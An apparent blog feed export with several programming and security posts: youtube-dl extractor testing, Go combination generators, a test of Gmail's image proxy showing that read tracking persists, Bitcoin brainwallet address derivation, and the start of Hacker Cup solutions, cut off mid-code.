<p>Now just run it, sit back and enjoy (and test a bunch of videos to be sure!)</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">m</span> <span class="n">youtube_dl</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">vine</span><span class="o">.</span><span class="n">co</span><span class="o">/</span><span class="n">v</span><span class="o">/</span><span class="n">b9KOOWX7HUx</span>
</span><span class="line"><span class="p">[</span><span class="n">Vine</span><span class="p">]</span> <span class="n">b9KOOWX7HUx</span><span class="p">:</span> <span class="n">Downloading</span> <span class="n">webpage</span>
</span><span class="line"><span class="p">[</span><span class="n">Vine</span><span class="p">]</span> <span class="n">b9KOOWX7HUx</span><span class="p">:</span> <span class="n">Extracting</span> <span class="n">information</span>
</span><span class="line"><span class="p">[</span><span class="n">download</span><span class="p">]</span> <span class="n">Destination</span><span class="p">:</span> <span class="n">Chicken</span><span class="o">.-</span><span class="n">b9KOOWX7HUx</span><span class="o">.</span><span class="n">mp4</span>
</span><span class="line"><span class="p">[</span><span class="n">download</span><span class="p">]</span> <span class="mi">100</span><span class="o">%</span> <span class="n">of</span> <span class="mf">884.30</span><span class="n">KiB</span> <span class="ow">in</span> <span class="mo">00</span><span class="p">:</span><span class="mo">00</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Finally, please <a href="https://github.com/rg3/youtube-dl/pulls">submit a PR</a> to get your IE included in ytdl. Don’t worry, if it downloads, we will be happy to merge it, and if it doesn’t, we will be happy to help!</p>

<h2 id="ah-add-a-test">Ah, add a test</h2>

<p>Forgot to mention, ytdl has a complete testing system built in. It is really important that you add a test to your IE before submitting it, as otherwise it would not be possible to do maintenance of so many IEs that break all the time when sites change layout.</p>

<p>Try to write one for each video or URL type.</p>

<p>You just need to add a <code>_TEST</code> dict property (or a <code>_TESTS</code> list of dicts) looking like this:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="n">_TEST</span> <span class="o">=</span> <span class="p">{</span>
</span><span class="line">    <span class="s">u&#39;url&#39;</span><span class="p">:</span> <span class="s">u&#39;https://vine.co/v/b9KOOWX7HUx&#39;</span><span class="p">,</span>
</span><span class="line">    <span class="s">u&#39;file&#39;</span><span class="p">:</span> <span class="s">u&#39;b9KOOWX7HUx.mp4&#39;</span><span class="p">,</span>
</span><span class="line">    <span class="s">u&#39;md5&#39;</span><span class="p">:</span> <span class="s">u&#39;2f36fed6235b16da96ce9b4dc890940d&#39;</span><span class="p">,</span>
</span><span class="line">    <span class="s">u&#39;info_dict&#39;</span><span class="p">:</span> <span class="p">{</span>
</span><span class="line">        <span class="s">u&quot;id&quot;</span><span class="p">:</span> <span class="s">u&quot;b9KOOWX7HUx&quot;</span><span class="p">,</span>
</span><span class="line">        <span class="s">u&quot;ext&quot;</span><span class="p">:</span> <span class="s">u&quot;mp4&quot;</span><span class="p">,</span>
</span><span class="line">        <span class="s">u&quot;title&quot;</span><span class="p">:</span> <span class="s">u&quot;Chicken.&quot;</span>
</span><span class="line">    <span class="p">}</span>
</span><span class="line"><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>The properties are as follows:</p>

<ul>
  <li><code>url</code> is the input URL</li>
  <li><code>md5</code> is the md5 hash <strong>of the first 10KB</strong> of the file, to get it download the video with the <code>--test</code> flag and run <code>md5sum</code> on it</li>
  <li><code>info_dict</code> is just a dict of fields that will be checked against the <code>_real_extract</code> return value (missing fields will be ignored)</li>
  <li>
    <strike>`file` is the filename of the resulting video, with this format &#8220;`{id}.{ext}`&#8221;</strike>
    <p><code>file</code> is deprecated, simply add <code>info_dict.id</code> and <code>info_dict.ext</code></p>
  </li>
</ul>

<p>You can run a single IE test on all the supported Python environments using <a href="https://testrun.org/tox/latest/">tox</a></p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="err">$</span> <span class="n">tox</span> <span class="n">test</span><span class="o">.</span><span class="n">test_download</span><span class="p">:</span><span class="n">TestDownload</span><span class="o">.</span><span class="n">test_Vine</span>
</span><span class="line"><span class="p">[</span><span class="o">...</span><span class="p">]</span>
</span><span class="line"><span class="n">__________</span> <span class="n">summary</span> <span class="n">__________</span>
</span><span class="line">  <span class="n">py26</span><span class="p">:</span> <span class="n">commands</span> <span class="n">succeeded</span>
</span><span class="line">  <span class="n">py27</span><span class="p">:</span> <span class="n">commands</span> <span class="n">succeeded</span>
</span><span class="line">  <span class="n">py33</span><span class="p">:</span> <span class="n">commands</span> <span class="n">succeeded</span>
</span><span class="line">  <span class="n">congratulations</span> <span class="p">:)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<hr />

<p>In the next article we will have a look at how to write a IE for a more picky/obfuscated video site.</p>
]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[Callback-based combinations (in Go)]]></title>
      <link href="http://filippo.io/callback-based-combinations-in-go/"/>
    
    <updated>2014-01-16T15:20:00+01:00</updated>
    <id>http://filippo.io/callback-based-combinations-in-go</id>
    
      <content type="html"><![CDATA[<p>Let’s have a look at this task: generate all the <strong>combinations of <em>k</em> elements out of <em>N</em></strong>. That is, all the <em>unordered k-tuples</em> made of elements from a pool of length N. <a href="https://en.wikipedia.org/wiki/Combination">See Wikipedia</a> for more.</p>

<p>An example of an application: if you are bruteforcing two misspellings in a password, the optimal set of couples of characters to bruteforce at the same time is the set of all the combinations of 2 characters out of the password.</p>

<p>There are a number of ways you can do this in code. Algorithm-wise you have to choose between a recursive approach and an iterative one. The recursive one might be more immediate for some people, but it does. Not. Scale. (<em>Recursion limit reached</em> anyone?) Also in some languages <strong>function calls are really expensive</strong>.</p>

<p>However what this article is about is how to grab the output. First you have to decide whether to return <em>k</em>-tuples of indices in 0 – N-1 or of actual pool elements.</p>

<p>For example with a pool of elements of <code>qwerty</code> and a <em>k</em> of 2, you can decide to return values like <code>(q, t)</code> and <code>(t, y)</code> or <code>(0, 4)</code> and <code>(4, 5)</code>.</p>

<!-- more -->

<p>My opinion is that you should always prefer the indices:</p>

<ul>
  <li>to return actual elements you have to pass the pool to the algorithm;</li>
  <li>you can reuse a set of indices over two same-size pools;</li>
  <li>for some tasks you can avoid the work of extracting the values from the pool by index all the times (e.g. if you filter them);</li>
  <li>by returning elements you lose information about their index that might be irrecoverable (if there are duplicates in the pool) or expensive to recover (<code>O(N)</code>);</li>
  <li>sometimes, well, you just need the indices.</li>
</ul>

<p>Then, you can think to a number of approaches here:</p>

<ol>
  <li>just return an array or a set of all the combinations</li>
  <li>yield them (if you have support for generators)</li>
  <li>call a callback on each one</li>
  <li>plainly process them where you generate them</li>
</ol>

<p>I prefer by far the callback approach:</p>

<ul>
  <li>it is supported in much more languages than generators;</li>
  <li>can be used elegantly and succinctly with anonymous functions;</li>
  <li><strong>doesn’t require <code>k*N</code> memory</strong>, you can just filter or process them on the fly;</li>
  <li>you can build any other approach over it, e.g. by passing a <code>append</code> function as the callback;</li>
  <li>by using closures you can share the callee scope;</li>
  <li>keeps your code <a href="https://en.wikipedia.org/wiki/Don%27t_Repeat_Yourself">DRY</a>.</li>
</ul>

<p>So, code! Here are the Go snippets for combinations with and without repetitions. Most of it was translated to Go from <a href="http://docs.python.org/2/library/itertools.html#itertools.combinations">the Python documentation</a> and adapted according to the contents of this article.</p>

<div><script src="https://gist.github.com/8463644.js?file=combinations.go"></script>
<noscript><pre><code>func combinations(n, m int, f func([]int)) {
	// For each combination of m elements out of n
	// call the function f passing a list of m integers in 0-n
	// without repetitions
	
	// TODO: switch to iterative algo
	s := make([]int, m)
	last := m - 1
	var rc func(int, int)
	rc = func(i, next int) {
		for j := next; j &lt; n; j++ {
			s[i] = j
			if i == last {
				f(s)
			} else {
				rc(i+1, j+1)
			}
		}
		return
	}
	rc(0, 0)
}</code></pre></noscript></div>

<div><script src="https://gist.github.com/8463644.js?file=combinations_with_replacement.go"></script>
<noscript><pre><code>func combinations_with_replacement(n, m int, f func([]int)) {
	// For each combination of m elements out of n
	// call the function f passing a list of m integers in 0-n
	// with repetitions
	indices := make([]int, m)
	f(indices)

	for {
		var i int
		for i = m - 1; i &gt;= 0; i-- {
			if indices[i] != n-1 {
				break
			}
		}
		if i &lt; 0 {
			break
		}

		indices_i := indices[i]
		for k := i; k &lt; m; k++ {
			indices[k] = indices_i + 1
		}
		f(indices)
	}
}</code></pre></noscript></div>
]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[How the new Gmail image proxy actually works and what does this mean for you]]></title>
      <link href="http://filippo.io/how-the-new-gmail-image-proxy-works-and-what-does-this-mean-for-you/"/>
    
    <updated>2013-12-12T17:52:00+01:00</updated>
    <id>http://filippo.io/how-the-new-gmail-image-proxy-works-and-what-does-this-mean-for-you</id>
    
      <content type="html"><![CDATA[<p>Google <a href="http://gmailblog.blogspot.com/2013/12/images-now-showing.html">recently announced</a> that images in emails will be displayed automatically by default to Gmail users, thanks to an anonymizing proxy operated by them.</p>

<p>This, they say, will actually <em>benefit</em> users privacy.</p>

<p>This might very well be true if images are prefetched when an email is received. The <a href="https://support.google.com/mail/answer/145919?p=display_images&amp;rd=1">help page</a> however does not make it seem like so (and states that images are transcoded, interesting).</p>

<p>Since this feature has already been rolled out to me, I thought to check out how it actually works.</p>

<!-- more -->

<p>So, I set up a slightly modified SimpleHTTPServer to also log request headers (just added the line below)</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="k">print</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">dict</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s">&#39;,&#39;</span><span class="p">,</span> <span class="s">&#39;: &#39;</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Downloaded this image and exposed it at <code>http://filosottile.info/test.png</code></p>

<p><img src="http://filippo.io/images/test.png" alt="the test image" /></p>

<p>Here how a request from my browser looks like</p>

<div><script src="https://gist.github.com/7937352.js?file=browser_request"></script>
<noscript><pre><code>{
    &quot;accept-language&quot;: &quot;en-US,en;q=0.8,it-IT;q=0.6,it;q=0.4&quot;,
    &quot;accept-encoding&quot;: &quot;gzip,deflate,sdch&quot;,
    &quot;cache-control&quot;: &quot;max-age=0&quot;,
    &quot;connection&quot;: &quot;keep-alive&quot;,
    &quot;accept&quot;: &quot;image/webp,*/*;q=0.8&quot;,
    &quot;user-agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36&quot;,
    &quot;host&quot;: &quot;filosottile.info&quot;,
    &quot;if-modified-since&quot;: &quot;Wed, 31 Oct 2012 23:52:07 GMT&quot;
}
cpe-68-175-8-151.nyc.res.rr.com - - [12/Dec/2013 22:11:54] &quot;GET /test.png HTTP/1.1&quot; 200 -</code></pre></noscript></div>

<p>Then, I sent the following HTML message to myself at 17:21:29 EST (<a href="https://gist.github.com/FiloSottile/7937352#file-full_body">here</a> the full email body when received)</p>

<div><script src="https://gist.github.com/7937352.js?file=message.html"></script>
<noscript><pre><code>&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;
&lt;html&gt;
&lt;head&gt;&lt;title&gt;&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;

&lt;img src=&quot;http://filosottile.info/test.png&quot;&gt;

&lt;/body&gt;
&lt;/html&gt;</code></pre></noscript></div>

<p>It immediately showed up on my phone. No requests. I waited a bit and opened my desktop inbox. No request.</p>

<p><strong>Then, I opened the email, the image automatically loaded and immediately a request got logged on my server</strong></p>

<div><script src="https://gist.github.com/7937352.js?file=on_open"></script>
<noscript><pre><code>{
    &quot;host&quot;: &quot;filosottile.info&quot;,
    &quot;connection&quot;: &quot;Keep-alive&quot;,
    &quot;accept-encoding&quot;: &quot;gzip,deflate&quot;,
    &quot;user-agent&quot;: &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7 (via ggpht.com)&quot;
}
google-proxy-66-249-88-131.google.com - - [12/Dec/2013 22:23:40] &quot;GET /test.png HTTP/1.1&quot; 200 -</code></pre></noscript></div>

<p>The image is indeed transcoded: exact same metadata (format, size…) but different body. Here is it, as got from the URL <code>https://ci6.googleusercontent.com/proxy/5YvKA8rt5kSAfWUwLZ1LfA_3fBdc2Qr5pHI-aWBr8fg0I27pvkXn5vljroVhYVWBHb5iCIIs=s0-d-e1-ft#http://filosottile.info/test.png</code></p>

<p><img src="http://filippo.io/images/unnamed.png" alt="the test image" /></p>

<p>And here are the <code>md5sum</code> and <code>identify</code> outputs</p>

<div><script src="https://gist.github.com/7937352.js?file=image_files"></script>
<noscript><pre><code>MD5 (unnamed.png) = ff614aa9214d23e6c292d357f043a7a5
MD5 (test.png) = 5dfe622b1ce0d027e3918d601ff160d0
unnamed.png PNG 568x63 568x63+0+0 8-bit sRGB 8.98KB 0.000u 0:00.000
test.png PNG 568x63 568x63+0+0 8-bit sRGB 8.66KB 0.000u 0:00.009</code></pre></noscript></div>

<p>Also, no caching is performed server-side, every time I downloaded that URL, <a href="https://gist.github.com/FiloSottile/7937352#file-other_hits">a request showed up on my server</a>.</p>

<h2 id="so-whats-the-issue">So, what’s the issue?</h2>

<p>The issue is that the single most useful piece of information a sender gets from you (or the Google proxy) loading the image is <strong>that/when you read the email</strong>. And this is not mitigated at all by this system, as it is only really a proxy and when you open an email the server will see a request. Mix that with the ubiquitous uniquely-named images (images with a name that is unique to an email) and you get read notifications.</p>

<p>Ok, they won’t know my IP and this is really good, they won’t set tracking cookies to link my different email accounts and they won’t know what browser I’m running, they might even fail to exploit my machine thanks to transcoding (if they wanted to waste such a 0-day) but the default setting – what most users settle on, let’s face it – just got weaker on privacy.</p>

<p>Now, Gmail has “✓ Seen”.</p>

<p>Note: you can <a href="https://support.google.com/mail/answer/145919?p=display_images&amp;rd=1">turn automatic loading off</a> and gain the privacy benefits of the proxy anyway.</p>

<p>And you can <a href="https://twitter.com/FiloSottile">follow me on Twitter</a>, too.</p>

<p><a href="https://news.ycombinator.com/item?id=6898087">Discuss on HackerNews</a></p>

<h2 id="bonus-the-arstechnica-article">Bonus: the ArsTechnica article</h2>

<p>ArsTechnica put out <a href="http://arstechnica.com/information-technology/2013/12/gmail-blows-up-e-mail-marketing-by-caching-all-images-on-google-servers/">a terribly un-informed and un-researched article</a> that is so full of errors that I’m going to dissect it in reading order.</p>

<p>Starting from the title, <em>“Gmail blows up e-mail marketing by caching all images on Google servers”</em>. As you can see, this might even benefit email marketing, for sure not blow it up.</p>

<blockquote>
  <p>[…] it will cache all images for Gmail users. Embedded images will now be saved by Google, and the e-mail content will be modified to display those images from Google’s cache, instead of from a third-party server.</p>
</blockquote>

<p>Simply wrong.</p>

<blockquote>
  <p>E-mail marketers will no longer be able to get any information from images—they will see a single request from Google, which will then be used to send the image out to all Gmail users. Unless you click on a link, marketers will have no idea the e-mail has been seen.</p>
</blockquote>

<p>We verified that instead this data is alive and kickin’, and there is NOT a single request.</p>

<blockquote>
  <p>While this means improved privacy from e-mail marketers, Google will now be digging deeper than ever into your e-mails and literally modifying the contents. If you were worried about e-mail scanning, this may take things a step further.</p>
</blockquote>

<p>Google always modified the email contents to sanitize HTML and, guess what, to disable images. Also, nothing barred Google from fetching the images in your emails anyway.</p>

<blockquote>
  <p>Google servers should also be faster than the usual third-party image host.</p>
</blockquote>

<p>All the opposite, as it is a proxy server and NOT a caching server it adds roundtrips to image loading.</p>
]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[Brainwallets: from the password to the address]]></title>
      <link href="http://filippo.io/brainwallets-from-the-password-to-the-address/"/>
    
    <updated>2013-12-05T17:43:00+01:00</updated>
    <id>http://filippo.io/brainwallets-from-the-password-to-the-address</id>
    
      <content type="html"><![CDATA[<p><a href="https://en.bitcoin.it/wiki/Brainwallet">Brainwallets</a> are Bitcoin wallets generated uniquely from a passphrase that the users keeps in his mind so that it is required and sufficient to move the funds.</p>

<p>But what is actually the process that takes a password and spits a Bitcoin wallet address? Let’s dissect it.</p>

<h3 id="from-a-password-to-a-secret-value">1. From a password to a secret value</h3>

<p>So, we have a password, but we need a fixed-size (256-bit) secret value to make our private key. This step can be done in a number of ways as it boils down to hashing the password but is crucial to the strength of the resulting brainwallet.</p>

<!-- more -->

<p>Let’s have a look at how popular Brainwallet generators do it. (As of 20131204)</p>

<table>
  <thead>
    <tr>
      <th><strong>Generator</strong></th>
      <th><strong>Algorithm</strong></th>
      <th><strong>Notes</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><a href="http://brainwallet.org/">brainwallet.org</a></td>
      <td>SHA256(password)</td>
      <td> </td>
    </tr>
    <tr>
      <td><a href="https://www.bitaddress.org/">bitaddress.org</a></td>
      <td>SHA256(password)</td>
      <td> </td>
    </tr>
    <tr>
      <td><a href="http://www.eharning.us/brainwallet-ltc/">eharning.us/brainwallet-ltc</a></td>
      <td>SHA256(password)</td>
      <td>Litecoin wallet</td>
    </tr>
    <tr>
      <td><a href="http://brainwallet.ltcbbs.com/">brainwallet.ltcbbs.com</a></td>
      <td>SHA256(password)</td>
      <td>Litecoin wallet</td>
    </tr>
    <tr>
      <td><a href="https://keybase.io/warp/">keybase.io/warp</a></td>
      <td>scrypt(password, salt) XOR<br />PBKDF2(password, salt)</td>
      <td> </td>
    </tr>
  </tbody>
</table>

<p>A lot of them just take the unsalted <a href="https://en.wikipedia.org/wiki/SHA-2">SHA256</a> hash of the password. <strong>This is wrong</strong>. Because SHA256 <strong>is fast</strong> and that means that an attacker can pregenerate huge tables of all possible brainwallets to monitor and empty them (Spoiler: they do). This kind of thing – turning a human supplied password into a public hash – is <strong>exactly</strong> what <a href="https://en.wikipedia.org/wiki/Key_stretching">password stretching</a> are for, and not using them here is an oversight as bad as not using them to store website user passwords, if not worse since here the hashes (the addresses) are public by default.</p>

<p>(Hint: use <a href="https://keybase.io/warp/">WarpWallet</a>. It’s built by people who know what they are doing, and employs a proper KDF, making attacking your wallet really difficult.)</p>

<h3 id="from-the-secret-value-to-a-private-key">2. From the secret value to a private key</h3>

<p>This is step is trivial. Actually, the output of the hashing above taken as a 256-bit unsigned number <em>is already the private key</em>, what is commonly called the <strong>secret exponent</strong>.</p>

<p>But we are used to see those pretty private keys beginning with a 5, so let’s see how it is encoded. That format is called <a href="https://en.bitcoin.it/wiki/WIF"><strong>WIF</strong>, Wallet import format</a>, and it is pretty handy as it has checksumming built in and employs a charset without confusing characters (<a href="https://en.bitcoin.it/wiki/Base58Check">Base58Check</a>) – exactly like a Bitcoin address.</p>

<p>A snippet is worth a thousand words:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="c"># Prepend the 0x80 version/application byte</span>
</span><span class="line"><span class="n">private_key</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\x80</span><span class="s">&#39;</span> <span class="o">+</span> <span class="n">private_key</span>
</span><span class="line"><span class="c"># Append the first 4 bytes of SHA256(SHA256(private_key)) as a checksum</span>
</span><span class="line"><span class="n">private_key</span> <span class="o">+=</span> <span class="n">sha256</span><span class="p">(</span><span class="n">sha256</span><span class="p">(</span><span class="n">private_key</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">())</span><span class="o">.</span><span class="n">digest</span><span class="p">()[:</span><span class="mi">4</span><span class="p">]</span>
</span><span class="line"><span class="c"># Convert to Base58 encoding</span>
</span><span class="line"><span class="n">code_string</span> <span class="o">=</span> <span class="s">&quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;</span>
</span><span class="line"><span class="n">value</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">private_key</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s">&#39;big&#39;</span><span class="p">)</span>
</span><span class="line"><span class="n">output</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class="line"><span class="k">while</span> <span class="n">value</span><span class="p">:</span>
</span><span class="line">    <span class="n">value</span><span class="p">,</span> <span class="n">remainder</span> <span class="o">=</span> <span class="nb">divmod</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="mi">58</span><span class="p">)</span>
</span><span class="line">    <span class="n">output</span> <span class="o">=</span> <span class="n">code_string</span><span class="p">[</span><span class="n">remainder</span><span class="p">]</span> <span class="o">+</span> <span class="n">output</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<h3 id="from-a-private-key-to-a-public-key">3. From a private key to a public key</h3>

<p>As <a href="https://en.wikipedia.org/wiki/Elliptic_Curve_DSA">Wikipedia tells us</a> a ECDSA private key is just the scalar product of a private key (the secret exponent) and the curve – <a href="https://en.bitcoin.it/wiki/Secp256k1">secp256k1</a> for Bitcoin – base point. <a href="https://en.wikipedia.org/wiki/Elliptic_curve_point_multiplication">How to do that</a> is complex, but let’s just take it for granted, as you’ll either use a librarty for this or research further by yourself.</p>

<p>What we get out of that operation is a pair <strong>(x, y)</strong> denoting a point on the curve, our public key.</p>

<!-- NOTE: **y**, known its sign, can be calculated from **x**, and this has spawned -->

<h3 id="from-the-public-key-to-a-bitcoin-address">4. From the public key to a Bitcoin address</h3>

<p>We’re almost there! Now we just need to turn that ECDSA public key into a standard Bitcoin address.</p>

<p>The process is the same as point 4, executed on the SHA256+RIPEMD160 hash of the packed x and y values. Go go snippet:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="c"># 1 byte 0x04, 32 bytes X, 32 bytes Y</span>
</span><span class="line"><span class="n">public_key</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\x04</span><span class="s">&#39;</span> <span class="o">+</span> <span class="n">x</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s">&#39;big&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">y</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s">&#39;big&#39;</span><span class="p">)</span>
</span><span class="line"><span class="c"># Run SHA256 and RIPEMD-160 chained</span>
</span><span class="line"><span class="n">address</span> <span class="o">=</span> <span class="n">ripemd160</span><span class="p">(</span><span class="n">sha256</span><span class="p">(</span><span class="n">public_key</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">())</span>
</span><span class="line"><span class="c"># From now on it is point 4</span>
</span><span class="line"><span class="c"># Prepend the 0x00 version/application byte for MainNet</span>
</span><span class="line"><span class="n">address</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span> <span class="o">+</span> <span class="n">address</span>
</span><span class="line"><span class="c"># Append the first 4 bytes of SHA256(SHA256(address)) as a checksum</span>
</span><span class="line"><span class="n">address</span> <span class="o">+=</span> <span class="n">sha256</span><span class="p">(</span><span class="n">sha256</span><span class="p">(</span><span class="n">address</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">())</span><span class="o">.</span><span class="n">digest</span><span class="p">()[:</span><span class="mi">4</span><span class="p">]</span>
</span><span class="line"><span class="c"># Convert to Base58 encoding</span>
</span><span class="line"><span class="n">code_string</span> <span class="o">=</span> <span class="s">&quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;</span>
</span><span class="line"><span class="n">value</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s">&#39;big&#39;</span><span class="p">)</span>
</span><span class="line"><span class="n">output</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class="line"><span class="k">while</span> <span class="n">value</span><span class="p">:</span>
</span><span class="line">    <span class="n">value</span><span class="p">,</span> <span class="n">remainder</span> <span class="o">=</span> <span class="nb">divmod</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="mi">58</span><span class="p">)</span>
</span><span class="line">    <span class="n">output</span> <span class="o">=</span> <span class="n">code_string</span><span class="p">[</span><span class="n">remainder</span><span class="p">]</span> <span class="o">+</span> <span class="n">output</span>
</span><span class="line"><span class="c"># This wan not needed for the WIF format, but the encoding wants us to normalize the number</span>
</span><span class="line"><span class="c"># (remove leading zeroes) and prepend a zero for each leading zero byte in the original</span>
</span><span class="line"><span class="n">output</span> <span class="o">=</span> <span class="n">output</span><span class="o">.</span><span class="n">lstrip</span><span class="p">(</span><span class="n">code_string</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
</span><span class="line"><span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">address</span><span class="p">:</span>
</span><span class="line">    <span class="k">if</span> <span class="n">ch</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span> <span class="n">output</span> <span class="o">=</span> <span class="n">code_string</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">output</span>
</span><span class="line">    <span class="k">else</span><span class="p">:</span> <span class="k">break</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>And it’s done!</p>

]]></content>
    
  </entry>
  
  <entry>
    
      <title type="html"><![CDATA[Pythonic solutions to the Facebook Hacker Cup 2014 Qualification Round]]></title>
      <link href="http://filippo.io/pythonic-solutions-to-the-facebook-hacker-cup-2014-qualification-round/"/>
    
    <updated>2013-11-25T10:52:00+01:00</updated>
    <id>http://filippo.io/pythonic-solutions-to-the-facebook-hacker-cup-2014-qualification-round</id>
    
      <content type="html"><![CDATA[<p>Facebook organizes this cool competition called the <a href="https://www.facebook.com/hackercup">Hacker Cup</a>. Yesterday the Qualification Round finished, and the user solutions got published. So, since the problems text is under a <a href="https://creativecommons.org/">CC license</a> (thanks FB!) I’m publishing here the problems and my answers.</p>

<p>This code pretty much embodies why I love Python: it’s clear, fast to write and reads almost like English. When I (thought I) needed speed, I just turned at <a href="http://cython.org/">Cython</a> with a few edits to the code.</p>

<p><em>NOTE: if for some reason I misunderstood and I wasn’t allowed to do this, please get in contact with me ASAP and I’ll take this down.</em></p>

<!-- more -->

<h2 id="square-detector">Square Detector</h2>

<p>Read the <a href="https://gist.github.com/FiloSottile/7643628#file-square-detector-md">problem</a> and check out <a href="https://gist.github.com/FiloSottile/7643628#file-square_detector-txt">the test cases</a> and <a href="https://gist.github.com/FiloSottile/7643628#file-square_detector_answer-txt">the answer</a>.</p>

<p>This was an easy one, I just scanned the grid until I found a <code>#</code>, assumed it was the upper-left corner and counted the following <code>#</code> to learn the edge length. At this point I had all the info to build a model of how a correct grid should look like, so I just checked the real one against it.</p>

<div><script src="https://gist.github.com/7643628.js?file=Square%20Detector.py"></script>
<noscript><pre><code>#!/usr/bin/env python3
#-*- coding:utf-8 -*-

import sys

T = int(sys.stdin.readline().strip())

for t in range(1, T + 1):
    N = int(sys.stdin.readline().strip())
    GRID = [sys.stdin.readline().strip() for i in range(N)]

